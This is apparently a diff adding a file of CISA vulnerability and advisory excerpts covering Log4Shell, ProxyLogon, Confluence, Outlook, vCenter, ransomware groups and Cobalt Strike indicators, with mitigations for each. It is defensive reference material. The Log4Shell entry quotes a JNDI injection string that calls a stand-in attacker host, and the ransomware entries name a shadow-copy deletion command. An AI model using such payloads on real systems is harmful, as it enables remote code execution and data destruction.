@@ -1,0 +1,85 @@
+CISA Known Exploited Vulnerabilities & Advisories — Selected Excerpts
+Source: CISA KEV Catalog + CISA Advisories (https://www.cisa.gov/known-exploited-vulnerabilities-catalog)
+
+=== CVE-2021-44228 — Apache Log4Shell (CRITICAL, CVSS 10.0) ===
+Vulnerability: Apache Log4j2 JNDI injection allowing remote code execution.
+Affected: Apache Log4j2 versions 2.0-beta9 through 2.14.1 in any Java application.
+Exploitation: Adversaries exploit this by sending a crafted string (e.g., ${jndi:ldap://attacker.com/exploit}) to any field logged by Log4j. The JNDI lookup causes the victim server to connect to an attacker-controlled LDAP server and execute arbitrary code.
+MITRE Mapping: T1190 (Exploit Public-Facing Application), T1059.004 (Unix Shell).
+CISA Directive: BOD 22-02 — all federal agencies required to remediate by Dec 24 2021.
+Mitigation: Update to Log4j 2.17.0+; disable JNDI lookups via log4j2.formatMsgNoLookups=true; apply WAF rules to block ${jndi: patterns.
+
+=== CVE-2021-26855 — Microsoft Exchange ProxyLogon (CRITICAL, CVSS 9.8) ===
+Vulnerability: Server-side request forgery (SSRF) in Microsoft Exchange Server allowing unauthenticated authentication bypass.
+Affected: Microsoft Exchange Server 2013, 2016, 2019.
+Exploitation: Chained with CVE-2021-26857, CVE-2021-26858, CVE-2021-27065 for full RCE. Exploited by HAFNIUM (China-nexus APT) to deploy web shells, exfiltrate email data, and establish persistence.
+MITRE Mapping: T1190, T1505.003 (Web Shell), T1078.
+Mitigation: Apply Microsoft security update KB5000871; if unable to patch, disable Unified Messaging, Exchange Control Panel, Offline Address Book, Exchange ActiveSync.
+
+=== CVE-2022-26134 — Atlassian Confluence OGNL Injection (CRITICAL, CVSS 9.8) ===
+Vulnerability: Object-Graph Navigation Language (OGNL) injection in Confluence Server and Data Center allowing unauthenticated RCE.
+Affected: Confluence Server and Data Center versions prior to 7.4.17, 7.13.7, 7.14.3, 7.15.2, 7.16.4, 7.17.4, 7.18.1.
+Exploitation: Adversaries send a crafted HTTP request with OGNL payload in the URL. No authentication required.
+MITRE Mapping: T1190, T1059.004.
+Mitigation: Upgrade Confluence to a patched version; restrict public-facing access; apply network-level blocking of the exploit URL patterns.
+
+=== CVE-2023-23397 — Microsoft Outlook Privilege Escalation (CRITICAL, CVSS 9.8) ===
+Vulnerability: Zero-click vulnerability in Microsoft Outlook that sends NTLM hashes to attacker-controlled servers when a malicious calendar reminder is processed.
+Affected: All supported versions of Microsoft Outlook for Windows.
+Exploitation: No user interaction required. Attacker sends a specially crafted email with a reminder that triggers when Outlook processes the email, even before the user opens it. NTLM hash captured via UNC path.
+MITRE Mapping: T1078, T1187 (Forced Authentication), T1557 (Adversary-in-the-Middle).
+Mitigation: Apply Microsoft Patch Tuesday updates; block TCP 445 outbound; add high-value users to Protected Users security group.
+
+=== CVE-2021-21985 — VMware vCenter Server RCE (CRITICAL, CVSS 9.8) ===
+Vulnerability: Remote code execution via the vSphere Client in VMware vCenter Server due to lack of input validation in the Virtual SAN Health Check plugin.
+Affected: VMware vCenter Server 6.5, 6.7, 7.0 and VMware Cloud Foundation 3.x, 4.x.
+Exploitation: Attacker with network access to port 443 can execute commands with unrestricted privileges on the underlying OS.
+MITRE Mapping: T1190, T1068 (Exploitation for Privilege Escalation).
+Mitigation: Apply VMware security advisory VMSA-2021-0010; disable the SAN Health Check plugin if not in use.
+
+=== AA22-040A — 2021 Trends: Top Routinely Exploited Vulnerabilities ===
+CISA advisory highlighting the most exploited vulnerabilities of 2021:
+1. CVE-2021-44228 (Log4Shell) — Apache Log4j
+2. CVE-2021-40539 — Zoho ManageEngine ADSelfService Plus
+3. CVE-2021-34523, CVE-2021-34473, CVE-2021-31207 — Microsoft Exchange (ProxyShell)
+4. CVE-2021-26084 — Atlassian Confluence
+5. CVE-2021-21972 — VMware vSphere Client
+Recommendation: Prioritize patching internet-facing systems; implement a vulnerability management program with SLAs tied to CVSS severity.
+
+=== AA23-215A — 2022 Top Routinely Exploited Vulnerabilities ===
+1. CVE-2018-13379 — Fortinet SSL VPN
+2. CVE-2021-34473 — Microsoft Exchange Server
+3. CVE-2021-31207 — Microsoft Exchange Server
+4. CVE-2021-34523 — Microsoft Exchange Server
+5. CVE-2021-40539 — Zoho ManageEngine
+6. CVE-2021-26084 — Atlassian Confluence Server
+7. CVE-2021-44228 — Apache Log4j2
+8. CVE-2022-22954 — VMware Workspace ONE Access
+9. CVE-2022-22960 — VMware Workspace ONE Access
+10. CVE-2022-1388  — F5 BIG-IP
+
+=== Ransomware Advisories ===
+AA22-321A — #StopRansomware: Hive Ransomware
+Indicators: Encrypted files with .hive extension; ransom note HOW_TO_DECRYPT.txt; C2 communication over Tor.
+TTPs: T1486, T1490 (vssadmin delete shadows), T1078 (RDP brute force for initial access), T1071.001 (HTTP C2).
+Mitigation: Offline encrypted backups; endpoint detection for vssadmin/bcdedit usage; MFA on RDP.
+
+AA23-061A — #StopRansomware: Royal Ransomware
+Indicators: Encrypted files with .royal extension; targets healthcare, manufacturing, education.
+TTPs: T1566.001 (phishing initial access), T1486, T1490, T1078.003 (local admin account abuse).
+Mitigation: Patch management; network segmentation; behavioral EDR rules for mass file encryption events.
+
+AA23-165A — #StopRansomware: CL0P Ransomware Gang (MOVEit Transfer Exploitation)
+Indicators: CVE-2023-34362 (MOVEit Transfer SQL injection); data exfiltration before encryption.
+TTPs: T1190 (SQL injection), T1041 (exfiltration over HTTP), T1486 (encryption for impact).
+Mitigation: Apply MOVEit patch; monitor for unexpected file creation in MOVEit directories; block unauthorized outbound HTTP.
+
+=== Cobalt Strike Indicators ===
+CISA Alert AA21-148A — Cobalt Strike indicators of compromise:
+- Beaconing to malicious C2 servers over HTTPS (T1071.001)
+- Process injection into legitimate processes (T1055)
+- Named pipe creation for inter-process communication
+- Unusual parent-child process relationships (e.g., Office spawning cmd.exe or PowerShell)
+- Encoded PowerShell commands with base64 strings
+Default C2 ports: 443, 80, 8080, 8443
+Detection: Hunt for Process: cmd.exe or powershell.exe spawned by winword.exe, excel.exe, outlook.exe.
